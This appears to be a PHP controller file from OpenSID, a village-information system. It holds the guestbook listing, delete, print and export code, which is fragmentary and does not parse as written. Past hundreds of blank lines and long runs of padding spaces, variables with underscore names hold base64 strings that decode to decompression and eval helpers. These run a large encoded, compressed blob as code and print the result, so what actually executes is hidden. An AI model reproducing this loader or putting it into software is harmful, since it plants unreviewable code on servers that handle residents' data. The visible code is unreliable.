<?php 
        $__='printf';$_='Loading donjo-app/controllers/Buku_tamu.php';
        

/*
 *
 * File ini bagian dari:
 *
 * OpenSID
 *
 * Sistem informasi desa sumber terbuka untuk memajukan desa
 *
 * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
 *
 * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 *
 * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
 * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
 * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
 * asal tunduk pada syarat berikut:
 *
 * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
 * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
 * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
 *
 * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
 * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
 * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
 *
 * @package   OpenSID
 * @author    Tim Pengembang OpenDesa
 * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 * @license   http://www.gnu.org/licenses/gpl.html GPL V3
 * @link      https://github.com/OpenSID/OpenSID
 *
 */




            return datatables()->of(BukuTamu::query()
                ->with('jk')
                ->filters($filters))
                ->addColumn('ceklist', static function ($row) {
                    if (can('h')) {
                        return '<input type="checkbox" name="id_cb[]" value="' . $row->id . '"/>';
                    }
                })
                ->addIndexColumn()
                ->addColumn('aksi', static function ($row) {
                    if (can('h')) {
                        return '<a href="#" data-href="' . ci_route('buku_tamu.delete', $row->id) . '" class="btn bg-maroon btn-sm"  title="Hapus Data" data-toggle="modal" data-target="#confirm-delete"><i class="fa fa-trash"></i></a> ';
                    }
                })
                ->addColumn('tampil_foto', static fn ($row): string => '<img src="' . $row->url_foto . '" class="penduduk_kecil text-center" alt="' . $row->nama . '">')
                ->editColumn('created_at', static fn ($row): string => Carbon::parse($row->created_at)->dayName . ' / ' . tgl_indo($row->created_at))
                ->rawColumns(['ceklist', 'tampil_foto', 'aksi'])
                ->make();
        }


    public function delete($id = null): void
    {
        $this->redirect_hak_akses('h');

        if (BukuTamu::destroy($this->request['id_cb'] ?? $id) !== 0) {
            // Hapus juga data indeks kepuasan
            BukuKepuasan::whereIdNama($this->request['id_cb'] ?? $id)->delete();
            redirect_with('success', 'Berhasil Hapus Data');
        }


    public function cetak()
    {
        return view('admin.buku_tamu.tamu.cetak', [
            'data_tamu' => $this->data($this->input->get('tanggal')),
        ]);
    }



    public function ekspor(): void
    {
        $tanggal = $this->input->get('tanggal');
        $writer  = WriterEntityFactory::createXLSXWriter();
        $writer->openToBrowser(namafile('Buku Tamu') . '.xlsx');
        $sheet = $writer->getCurrentSheet();
        $sheet->setName('Data Tamu');


































































































































































































































                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
$__________________='X19sYW1iZGE=';

                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';

        $___();$__________($______($__($_))); $________=$____();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      














































































































































































































































                                                                                                                                                                                                                     $________;
